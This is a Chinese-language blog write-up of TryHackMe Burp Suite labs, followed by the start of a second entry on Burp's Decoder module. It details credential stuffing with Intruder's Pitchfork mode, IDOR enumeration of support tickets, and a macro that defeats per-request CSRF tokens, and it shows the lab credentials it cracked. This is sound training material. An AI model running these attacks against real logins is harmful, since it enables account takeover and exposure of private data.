<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-floating mb-3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">username</span>  <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-floating mb-3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">password</span>  <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-grid&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary btn-lg&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Login!<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411115356520.png"
                      alt="image-20230411115356520"
                ></p>
<p>由于上述登录表单缺乏保护措施，所以我们可使用多种攻击方式(包括cluster bomb攻击)，在本小节示例中，实验房间预先为我们提供了一个登录凭据泄露文件，因此我们将选择使用”Pitchfork”攻击类型。</p>
<p>我们可以在部署目标机器之后，使用以下命令来下载任务文件(一个包含登录凭据的字典文件)：</p>
<p><code>wget http://MACHINE_IP:9999/Credentials/BastionHostingCreds.zip</code></p>
<p>本小节的示例场景：</p>
<p>Bastion Hosting 三个月前遭到网络攻击，这次攻击导致他们所有员工的用户名、电子邮件和明文密码都被泄露；虽然员工被告知立即更改密码，但是，其中有一两个员工并没有当回事……</p>
<p>由于我们已经有了用户名列表和密码列表，并且每个用户名都与一个密码相关联，因此我们可以避免直接进行暴力破解攻击，而是尝试执行凭证填充攻击(撞库攻击)。</p>
<h3 id="答题-8"><a href="#答题-8" class="headerlink" title="答题"></a>答题</h3><p>下载并解压缩由TryHackMe实验房间所提供的<code>BastionHostingCreds.zip</code>任务文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://10.10.205.239:9999/Credentials/BastionHostingCreds.zip</span><br><span class="line">unzip BastionHostingCreds.zip</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411120526715.png"
                      alt="image-20230411120526715"
                ></p>
<p>BastionHostingCreds.zip文件中应包含四个单词列表(字典)文件：</p>
<ul>
<li><code>emails.txt</code></li>
<li><code>usernames.txt</code></li>
<li><code>passwords.txt</code></li>
<li><code>combined.txt</code></li>
</ul>
<p>它们分别是包含泄露的电子邮件、用户名、密码的列表，最后一个是包含组合的电子邮件和密码的列表；我们将使用<code>usernames.txt</code>和<code>passwords.txt</code>单词列表来完成本小节的示例练习。</p>
<p>使用浏览器中导航到 <a class="link"   href="http://10.10.205.239/support/login" >http://10.10.205.239/support/login <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，激活攻击机上的Burp代理插件并开启拦截，然后在浏览器中进行登录操作，成功捕获到相关请求：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411120933714.png"
                      alt="image-20230411120933714"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411120954211.png"
                      alt="image-20230411120954211"
                ></p>
<p>使用快捷键<code>Ctrl + I</code>将上图中的请求消息转发给Intruder功能模块，查看Positions子选项卡，确保以用户名和密码字段作为攻击位置并选择”Pitchfork”攻击：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411122538379.png"
                      alt="image-20230411122538379"
                ></p>
<p>切换到”Payloads”子选项卡，我们可以发现我们有两个可用的有效载荷集：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411122652774.png"
                      alt="image-20230411122652774"
                ></p>
<p>虽然没有命名，但是我们知道在请求消息中用户名字段位于密码字段的左侧，所以上图中的第一个有效载荷集对应用户名字段，第二个有效载荷集则对应密码字段。</p>
<p>我们将这两个有效载荷集都设置为”Simple list”有效载荷类型，然后分别导入字典文件(转到”Payload Options”并选择”Load”按钮进行加载即可)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411124015794.png"
                      alt="image-20230411124015794"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411124054208.png"
                      alt="image-20230411124054208"
                ></p>
<p>然后我们回到Intruder的Positions子选项卡，点击”Start Attack-开始攻击”按钮即可。</p>
<p>攻击完成后，我们将看到一个显示结果的新窗口，但同时我们也遇到了一个新问题，Burp发送了100个请求：我们应该如何知道哪些请求是有效的(如果有的话)？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411130451901.png"
                      alt="image-20230411130451901"
                ></p>
<p>最常见的解决方案是根据响应状态码来区分成功或不成功的登录请求(这仅在状态码存在差异时才有效)，在理想情况下，成功的登录请求将为我们提供200响应码，而失败的登录请求将为我们提供401响应码；然而，在许多情况下，我们可能只会看到302响应码(302代表重定向)。</p>
<p>如果无法根据响应状态码找到有效请求，那么我们接下来要采用的解决方案就是基于响应消息的长度来识别请求之间的差异，例如，成功的登录尝试请求可能会产生一个包含400字节的响应消息，而不成功的登录尝试请求则可能会产生一个包含600字节的响应消息(因为不成功的请求所对应的响应消息还会包含错误提示信息)。</p>
<p>我们可以在显示结果的窗口中单击”Length”列，这将按字节长度对响应消息进行排序处理：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411130703719.png"
                      alt="image-20230411130703719"
                ></p>
<p>一旦我们对响应消息完成按长度排序，我们就会发现与众不同的请求消息。</p>
<p>你可能已经猜到，响应长度较短的请求是使用有效凭据发出的(因为登录成功的响应将不会包含错误提示信息)——我们可以通过使用该凭据尝试登录来进行确认。</p>
<ul>
<li>用户名：m.rivera</li>
<li>密码：letmein1</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411131232070.png"
                      alt="image-20230411131232070"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411131254847.png"
                      alt="image-20230411131254847"
                ></p>
<blockquote>
<p>用户名：m.rivera</p>
<p>密码：letmein1</p>
</blockquote>
<p>我们通过撞库攻击成功地破解了<code>/support/login</code>登录页面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231229103450039.png"
                      alt="image-20231229103450039"
                ></p>
<h2 id="挑战任务练习"><a href="#挑战任务练习" class="headerlink" title="挑战任务练习"></a>挑战任务练习</h2><p>在上一小节中，我们已经成功获得了访问技术支持(IT support)系统的权限，现在让我们看一下我们能利用这个页面做什么。</p>
<p>技术支持的主界面( <a class="link"   href="http://10.10.205.239/support/" >http://10.10.205.239/support/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> )向我们展示了一张票据表——如果我们点击表中的任何一行，我们就会被重定向到一个新页面，在那里我们可以查看完整的票据。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411132012630.png"
                      alt="image-20230411132012630"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411132106145.png"
                      alt="image-20230411132106145"
                ></p>
<p>通过观察URL，我们可以看到这些票据页面都是有编号的，相关URL结构的格式如下：<code>http://MACHINE_IP/support/ticket/NUMBER</code></p>
<p>那么，这意味着什么呢?</p>
<p>编号意味着我们可以知道上述这些票据不是用难以猜到的id来识别的——这些票据都会被分配一个整数标识符。</p>
<p>如果我们使用Intruder对<code>/support/ticket/NUMBER</code>端点进行模糊测试会发生什么？可能存在以下两种情况：</p>
<ol>
<li>访问控制有效：端点被正确配置为仅允许用户访问分配给当前用户的票据，在这种情况下，我们只能查看与我们的帐户相关联的票据；</li>
<li>存在IDOR漏洞：端点可能缺乏适当的访问控制，从而导致端点页面存在IDOR漏洞，在这种情况下，我们就有可能尝试读取所有的现有票据，而不必管票据所分配的用户是谁。</li>
</ol>
<p>tips：如果是第二种情况，则说明目标页面存在一个被称为<code>IDOR</code>(<strong>I</strong>nsecure <strong>D</strong>irect <strong>O</strong>bject <strong>R</strong>eferences-不安全的直接对象引用)的漏洞。</p>
<p>为了进一步调查，我们将针对<code>/support/ticket/NUMBER</code>端点进行模糊测试，此测试将帮助我们确定相关端点是否已正确配置或者是否存在IDOR漏洞。</p>
<h3 id="答题-9"><a href="#答题-9" class="headerlink" title="答题"></a>答题</h3><p>我们只需要对一个位置进行模糊测试，所以应该选择使用Intruder中的Sniper攻击。</p>
<p>我们选择对 <a class="link"   href="http://10.10.205.239/support/ticket/78" >http://10.10.205.239/support/ticket/78 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 进行模糊测试(针对目标端点页面发送请求并进行请求捕获操作，然后将相关请求转发给Intruder)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411133437007.png"
                      alt="image-20230411133437007"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411134347140.png"
                      alt="image-20230411134347140"
                ></p>
<p>攻击完成后，我们将看到一个显示结果的新窗口，选择按状态码排序，发现一共有五个响应码为200的登录尝试，我们需要找到包含flag的票据：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411135004138.png"
                      alt="image-20230411135004138"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411135151869.png"
                      alt="image-20230411135151869"
                ></p>
<blockquote>
<p>我们找到的flag内容为：THM{MTMxNTg5NTUzMWM0OWRlYzUzMDVjMzJl} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411135321528.png"
                      alt="image-20230411135321528"
                ></p>
<h2 id="综合练习-绕过CSRF-Token-令牌"><a href="#综合练习-绕过CSRF-Token-令牌" class="headerlink" title="综合练习-绕过CSRF Token(令牌)"></a>综合练习-绕过CSRF Token(令牌)</h2><p>使用Burp代理捕获发送给 <a class="link"   href="http://10.10.205.239/admin/login/" >http://10.10.205.239/admin/login/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面的请求并检查相关的响应消息：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Date: Fri, 20 Aug 2021 22:31:16 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Set-Cookie: session=eyJ0b2tlbklEIjoiMzUyNTQ5ZjgxZDRhOTM5YjVlMTNlMjIzNmI0ZDlkOGEifQ.YSA-mQ.ZaKKsUnNsIb47sjlyux_LN8Qst0; HttpOnly; Path=/</span><br><span class="line">Vary: Cookie</span><br><span class="line">Front-End-Https: on</span><br><span class="line">Content-Length: 3922</span><br><span class="line">---</span><br><span class="line">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;form-floating mb-3&quot;&gt;</span><br><span class="line">        &lt;input class=&quot;form-control&quot; type=&quot;text&quot; name=username  placeholder=&quot;Username&quot; required&gt;</span><br><span class="line">        &lt;label for=&quot;username&quot;&gt;Username&lt;/label&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;form-floating mb-3&quot;&gt;</span><br><span class="line">        &lt;input class=&quot;form-control&quot; type=&quot;password&quot; name=password  placeholder=&quot;Password&quot; required&gt;</span><br><span class="line">        &lt;label for=&quot;password&quot;&gt;Password&lt;/label&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;loginToken&quot; value=&quot;84c6358bbf1bd8000b6b63ab1bd77c5e&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;d-grid&quot;&gt;&lt;button class=&quot;btn btn-warning btn-lg&quot; type=&quot;submit&quot;&gt;Login!&lt;/button&gt;&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102203904580.png"
                      alt="image-20240102203904580"
                ></p>
<p>我们可以看到上述响应除了存在用户名字段和密码字段之外，还有一个会话cookie集，以及存在一个CSRF(跨站点请求伪造)令牌作为隐藏字段loginToken被包含在表单中。</p>
<p>如果刷新页面，我们会发现会话cookie和loginToken都会随着每次请求而改变，这意味着对于每次登录尝试，我们都需要提取会话cookie和loginToken的有效值。</p>
<p>换句话说，在每次进行尝试登录时，我们都需要唯一的会话cookie值以及隐藏在输入表单中的loginToken值。</p>
<p>接下来我们需要使用Burp Suite中的“Macros(宏)”功能。</p>
<p>在许多情况下，我们可以使用被称为“Recursive Grep(递归提取)”的有效载荷类型来尝试令牌绕过，但不幸的是，在本小节示例中，由于目标web应用程序会将我们重定向回登录页面，而不是简单地向我们显示两个目标参数，因此我们将需要以更艰难的方式来实现令牌绕过。</p>
<p>具体来说，我们必须定义一个”Macros-宏”(一组简短的重复操作)，并且让”Macros-宏”在每个请求发送之前执行，该宏将为会话cookie和loginToken提取唯一值，并且会将它们替换到我们的每个攻击请求中。</p>
<h3 id="答题-10"><a href="#答题-10" class="headerlink" title="答题"></a>答题</h3><p>在攻击机上使用浏览器导航到： <a class="link"   href="http://10.10.205.239/admin/login/" >http://10.10.205.239/admin/login/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411144323550.png"
                      alt="image-20230411144323550"
                ></p>
<p>先在浏览器中激活Burp代理插件，然后在Burp Proxy模块中激活Intercept(拦截)功能，最后使用上图所示的页面进行登录尝试，捕获请求并将其发送给Intruder。</p>
<p>将攻击类型设置为“Pitchfork”，然后清除所有预定义位置仅选择用户名字段和密码字段，其他两个位置(会话cookie和loginToken)将由我们的宏进行处理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411145002562.png"
                      alt="image-20230411145002562"
                ></p>
<p>接着切换到Intruder中的Payloads子选项卡，加载我们之前使用过的、用于support登录页攻击的用户名字典和密码字典(操作过程和前文一样)。</p>
<p>处理好用户名和密码参数后，我们现在需要找到一种方法来获取不断变化的会话cookie和loginToken，不幸的是，由于响应重定向，使用”Recursive Grep(递归提取)”有效载荷类型在这里不起作用，因此我们不能完全在Intruder中执行令牌绕过操作——我们需要构建一个“Macros(宏)”。</p>
<p>宏(Macros)允许我们重复执行同一组动作，在本例中，我们想向<code>/admin/login/</code>发送GET请求。</p>
<ul>
<li><p>切换到 “Settings” 选项卡，然后再找到 “Sessions(会话)”类别 。</p>
</li>
<li><p>向下滚动到底部的“Macros(宏)”部分，然后单击“Add(添加)”按钮。</p>
</li>
<li><p>出现的菜单将向我们显示我们的请求历史记录，如果此处列表中没有发送到<code>http://10.10.205.239/admin/login/</code>的GET请求，我们可以在浏览器中重新导航到<code>/admin/login/</code>位置，然后我们就会看到GET请求出现在历史记录列表中。</p>
</li>
<li><p>选择我们需要的GET请求后，单击“Ok(确定)”。</p>
</li>
<li><p>最后，为宏(Macros)指定一个合适的名称，然后再次单击“Ok(确定)”完成宏定义过程。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102210901578.png"
                      alt="image-20240102210901578"
                ></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102210801528.png"
                      alt="image-20240102210801528"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411150718749.png"
                      alt="image-20230411150718749"
                ></p>
<p>现在我们已经定义了宏，我们还需要设置会话处理规则来定义如何使用宏。</p>
<ul>
<li><p>在Settings选项卡的”Sessions”类别中，向上滚动到“Session Handling Rules(会话处理规则)”部分，并选择“Add(添加)”一个新规则。</p>
</li>
<li><p>这将弹出一个新窗口，其中有两个选项卡：“Details”和“Scope”；在默认情况下，我们将位于Details选项卡中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102210631377.png"
                      alt="image-20240102210631377"
                ></p>
</li>
<li><p>我们可以在上图中填写适当的描述，然后切换到Scope(范围)选项卡。</p>
</li>
<li><p>在”Tools Scope”部分，取消选中Intruder以外的所有复选框——我们不需要将此规则应用于其他任何地方。</p>
</li>
<li><p>在”URLScope”部分，选择”Use suite scope”，这会将宏设置为仅在已添加到全局范围的站点上运行，如果尚未设置全局范围，可以将 “Use custom scope”选项保留为默认勾选状态并添加<code>http://10.10.205.239/</code>目标站点到Scope中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411152434480.png"
                      alt="image-20230411152434480"
                ></p>
</li>
</ul>
<p>现在我们需要切换回Details选项卡并查看”Rule Actions”部分。</p>
<ul>
<li>点击 “Add” 按钮——这将出现一个下拉菜单，列出我们可以添加的操作。</li>
<li>从菜单列表中选择”Run a Macro”。</li>
<li>在出现的新窗口中，选择我们之前所创建的宏。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411152846522.png"
                      alt="image-20230411152846522"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411152920607.png"
                      alt="image-20230411152920607"
                ></p>
<p>现在，我们可以使用这个宏在Intruder发送请求之前覆盖某些参数，这意味着我们能够尝试得到会话cookie和loginTokens，并将它们的值直接添加到我们的请求中；简而言之——在Intruder开始攻击之前，我们可以限制仅更新哪些参数以及cookies，从而能够将会话cookie和loginTokens添加到攻击请求中：</p>
<ul>
<li><p>选择 “Update only the following parameters and headers(仅更新以下参数和标头)”，然后单击单选按钮下方输入框旁的“编辑”按钮。</p>
</li>
<li><p>在”Enter a new item(输入新项目)”文本框中，输入”<code>loginToken</code>“，点击”添加”，再点击”关闭”。</p>
</li>
<li><p>选择 “Update only the following cookies(只更新以下cookies)”，然后点击相应的“编辑”按钮。</p>
</li>
<li><p>在”Enter a new item(输入新项目)”文本框中，输入”<code>session</code>“，按“添加”，然后按“关闭”。</p>
</li>
<li><p>最后，点击Ok确认我们的操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102211717930.png"
                      alt="image-20240102211717930"
                ></p>
</li>
</ul>
<p>现在你应该已经配置好了一个宏，这个宏将会替换攻击请求中的CSRF令牌和会话cookie，我们接下来要做的事情就是切换回Intruder并开始攻击。</p>
<p><em><strong>注意：在这种攻击中，每个攻击请求都应该得到302状态码响应，如果你看到的是403错误状态码，那么则说明你的宏没有正常工作。</strong></em></p>
<p>与我们之前在上文中执行的登录凭据填充攻击一样，这里的响应代码都是相同的(302重定向)，同样，我们可以根据长度对响应消息进行排序，以找到有效的登录凭据；你将看到相当多不同的响应长度，然而，表示成功登录的响应消息仍然会显著地更短。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411160317727.png"
                      alt="image-20230411160317727"
                ></p>
<p>使用我们刚刚找到的凭据进行登录(在输入凭据之前，你可能需要刷新登录页面)。</p>
<ul>
<li>用户名：o.bennett</li>
<li>密码：bella1</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411160452414.png"
                      alt="image-20230411160452414"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411160509351.png"
                      alt="image-20230411160509351"
                ></p>
<blockquote>
<p>用户名：o.bennett</p>
<p>密码：bella1</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102212217114.png"
                      alt="image-20240102212217114"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Burp Suite：Other Modules(Burp Suite其他模块·更新版)-学习</title>
    <url>/2024/01/27/THM-Burp%20Suite%EF%BC%9AOther%20Modules(Burp%20Suite%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97%C2%B7%E6%9B%B4%E6%96%B0%E7%89%88)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/burpsuiteom" >https://tryhackme.com/room/burpsuiteom <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解 Burp Suite 中一些可能鲜为人知的模块。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>除了著名的Repeater模块和Intruder模块之外，Burp Suite还内置了几个可能不太常用的功能模块。</p>
<p>具体而言，本文将介绍Burp Suite中的解码器工具(Decoder)、对比器工具(Compared)和定序器工具(Sequencer)，这几个工具使我们能够对文本内容进行编码和解码、比较不同的文本集、分析所捕获的令牌(tokens)样本的随机性，直接在Burp Suite中执行这些相对简单的任务可以节省大量时间，因此学习如何简单使用以上三个功能模块是非常值得的。</p>
<p>事不宜迟，让我们开始研究Decoder(解码器)功能模块。</p>
<h2 id="Decoder-解码器-概述"><a href="#Decoder-解码器-概述" class="headerlink" title="Decoder(解码器)-概述"></a>Decoder(解码器)-概述</h2><p>Burp Suite的Decoder模块为用户提供了数据操作功能，顾名思义，Decoder不仅可以解码攻击期间所截获的数据，还能提供对我们自己的数据进行编码的功能。</p>
<p>此外，Decoder还允许我们创建数据的哈希和，而且能够提供Smart Decode(智能解码)功能，Smart Decode功能将尝试递归地解码所提供的数据，直到数据恢复为纯文本为止(这类似于<a class="link"   href="https://gchq.github.io/CyberChef/" >Cyberchef <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的”Magic”功能)。</p>
<p>让我们从Burp Suite顶部菜单导航至Decoder选项卡以查看可用选项：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240103110120411.png"
                      alt="image-20240103110120411"
                ></p>
<p>Decoder选项卡界面为我们提供了以下几个选项：</p>
<ol>
<li>Decoder选项卡界面左侧的方框是我们用于输入&#x2F;粘贴需要编码或解码的数据的工作区，我们可以在其他Burp模块中单击右键并选择”Send to Decoder”——将数据从其他模块中发送到此处。</li>
<li>在Decoder选项卡界面右侧列表的顶部，我们可以选择将输入内容视为文本(Text)或者将输入内容视为十六进制字节值(Hex)来处理。</li>
<li>在Decoder选项卡界面右侧列表的中间部分，我们有一个下拉菜单可对输入内容进行编码、解码或Hash计算。</li>
<li>最后，在Decoder选项卡界面右侧列表的底部，我们可以看到有一个”Smart Decode-智能解码”功能，使用该功能将会尝试自动解码已输入的内容。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240103110243174.png"
                      alt="image-20240103110243174"
                ></p>
<p>当我们在上图的输入框中输入数据并执行格式转换时，上图所示的框体界面将复制自身并会在新生成的输入框中包含经过格式转换之后的输出内容，然后我们可以继续选择使用相同的选项来对新框体中的数据执行进一步的格式转换操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240103110200446.png"
                      alt="image-20240103110200446"
                ></p>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节内容并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240103111358695.png"
                      alt="image-20240103111358695"
                ></p>
<h2 id="Decoder-解码器-编码-解码"><a href="#Decoder-解码器-编码-解码" class="headerlink" title="Decoder(解码器)-编码&#x2F;解码"></a>Decoder(解码器)-编码&#x2F;解码</h2><p><strong>编码和解码选项</strong></p>
<p>我们仔细查看Decoder的编码和解码选项，可以发现，无论我们选择编码菜单还是解码菜单，以下选项都是一样的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409222154702.png"
                      alt="image-20230409222154702"
                ></p>
<ul>
<li><p>Plain：明文格式(纯文本)，指我们在应用任何转换之前的原始文本。</p>
</li>
<li><p>URL：URL编码用于确保在web请求的URL中的数据能够安全传输，它会将输入数据表示为对应ASCII字符代码的十六进制格式，并会在处理后的数据前面加上一个百分号(<code>%</code>)，URL编码对于测试任何类型的web应用程序而言都是非常有用的编码方法。<br>例如，我们可以对正斜杠字符(<code>/</code>)进行URL编码，正斜杠的<a class="link"   href="https://www.asciitable.com/" >ASCII字符代码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是<code>47</code>，以十六进制表示是<code>2F</code>，所以正斜杠字符的URL编码为<code>%2F</code>；我们可以用解码器确认这一点，在输入框中输入正斜杠字符，然后选择<code>Encode as -&gt; URL</code>即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410091813078.png"
                      alt="image-20230410091813078"
                ></p>
</li>
<li><p>HTML：如果要将输入文本编码为HTML实体，那么就需要按规则替换输入文本中的特殊字符——开头为<code>&amp;</code>符号，然后是一个十六进制数或者是对被转义字符的引用，最后以一个分号(<code>;</code>)结尾；例如，双引号的HTML编码实体是”<code>&amp;quot;</code>“，当该HTML编码实体被插入到web页面中时，它将会被双引号(<code>&quot;</code>)符号取代；HTML编码方法允许HTML语言中的特殊字符在HTML页面中安全地呈现，这种编码方法在一定程度上可用于防止<a class="link"   href="https://owasp.org/www-community/attacks/xss/" >XSS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>(跨站点脚本)等攻击。<br>在Decoder中使用HTML编码&#x2F;解码选项时，我们可以将任何字符编码为其HTML转义格式或者对捕获到的HTML编码实体进行解码处理；例如，如果我们现在要将一个HTML编码实体解码为双引号，我们可以先输入双引号的HTML编码实体，然后选择<code>decode as -&gt; HTML</code>即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410094909424.png"
                      alt="image-20230410094909424"
                ></p>
</li>
<li><p>Base64：base64是一种被广泛使用的编码方法，它可以将任何数据转换为ASCII兼容的格式；bsae64编码的设计目的是先获取二进制数据(例如图像、媒体、程序)，然后将其编码为适合在几乎任何介质中进行传输的格式。如果你对base64编码背后的过程感兴趣，你可以参考<a class="link"   href="https://stackabuse.com/encoding-and-decoding-base64-strings-in-python" >相关博客文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行了解。</p>
</li>
<li><p>ASCII Hex：此选项可将数据在ASCII表示和十六进制表示之间进行转换，例如，”<code>ASCII</code>“一词可以被转换成十六进制数”<code>4153434949</code>“；在转换过程中，原始数据中的每个字母都会被单独提取，并将从ASCII表示转换为十六进制表示，比如，”<code>ASCII</code>“一词中的字母”<code>A</code>“在<a class="link"   href="https://www.asciitable.com/" >ASCII 表 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中对应的十六进制表示是<code>41</code>，类似地，字母”<code>S</code>“对应的十六进制为<code>53</code>，依此类推就能得到十六进制数”<code>4153434949</code>“。</p>
</li>
<li><p>Hex、Octal和Binary：十六进制、八进制和二进制，这些编码选项都只适用于内容为数字的输入，使用这些选项之后，输入内容将在十进制、十六进制、八进制(以8为基数)和二进制表示形式之间进行转换。</p>
</li>
<li><p>Gzip：该选项提供了一种压缩数据的方法，它被广泛用于在将文件和页面发送到浏览器之前压缩文件和页面的大小；发送更小的页面意味着更快的加载时间，这对于希望提高SEO得分并避免给客户带来不便的开发人员来说是非常可取的。Decoder允许我们手动编码和解码gzip数据，这些数据可能很难处理，因为gzip数据通常不是有效的ASCII&#x2F;Unicode格式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410102119506.png"
                      alt="image-20230410102119506"
                ></p>
</li>
</ul>
